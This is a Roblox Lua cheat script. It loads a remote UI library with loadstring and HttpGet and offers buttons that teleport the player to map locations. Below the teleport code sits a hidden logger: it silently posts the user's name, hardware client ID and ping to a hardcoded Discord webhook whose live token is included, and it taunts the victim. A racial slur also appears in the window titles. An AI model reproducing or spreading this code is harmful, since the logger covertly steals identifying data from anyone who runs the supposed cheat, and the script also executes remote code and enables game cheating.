local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("niggaclark3000 🧻", "DarkTheme")
local Tab = Window:NewTab("Teleport")
local Section = Tab:NewSection("Teleport")
Section:NewButton("MNG Base", "", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2176.06445, 199.557816, 4446.18604, 1, 0, 0, 0, 1, 0, 0, 0, 1)
end)

Section:NewButton("Bowrey Cubemart", "", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1598.35205, 216.655014, -1534.57629, 1, 0, 0, 0, 1, 0, 0, 0, 1)
end)

Section:NewButton("Mersea Auto", "", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(6470.3999, 231.996841, 3019.69971, 1, 0, 0, 0, 1, 0, 0, 0, 1)
end)

Section:NewButton("Bowrey Auto", "", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1810.91406, 221.255737, -1328.6333, 1, 0, 0, 0, 1, 0, 0, 0, 1)
end)

Section:NewButton("Woodbury Auto", "", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(10027.8262, 240.156189, 578.294678, 1, 0, 0, 0, 1, 0, 0, 0, 1)
end)







local webh = "https://discord.com/api/webhooks/1339460549431398482/zASFb-BCy3YujV1gyio0P0rpFqws3qQ3cpnqILWuVnBIQcl7eRhzf-1BZ287IumlZRWd"


pcall(function()
   local data = {

  ['embeds'] = {
    {
       ['title'] = 'nigga clark ultra logger',
       ['description'] = 'get logged hahah!!!',
       ['fields'] = {
          {name = 'User', value = game:GetService("Players").LocalPlayer.Name},
          {name = 'Hwid', value = game:GetService("RbxAnalyticsService"):GetClientId()},
          {name = "Ping", value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()},

        }
    }
  }
}
   
   if syn then
       local response = syn.request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif request then
       local response = request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif http_request then
       local response = http_request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   end
end)
